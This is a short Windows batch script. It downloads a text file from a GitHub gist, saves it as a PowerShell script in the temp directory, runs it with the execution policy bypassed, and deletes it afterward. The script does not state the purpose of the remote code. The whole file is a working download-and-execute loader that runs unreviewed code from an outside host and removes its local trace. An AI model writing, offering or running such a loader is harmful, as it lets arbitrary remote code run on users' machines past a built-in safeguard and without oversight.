@echo off
setlocal

:: Define the URL of the raw text file
set "url=https://gist.githubusercontent.com/blmpsaa/082e9192c84dd01b1151de46b13f9093/raw/4a48ef9548fa9a44a95a8517e7d7d6de22289e4b/gistfile1.txt"

:: Define the name of the temporary file
set "tempFile=%temp%\wdd_script.ps1"

:: Download the raw text file and save it as a PowerShell script
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempFile%'"

:: Execute the PowerShell script
powershell -ExecutionPolicy Bypass -File "%tempFile%"

:: Clean up the temporary file
del "%tempFile%"

endlocal
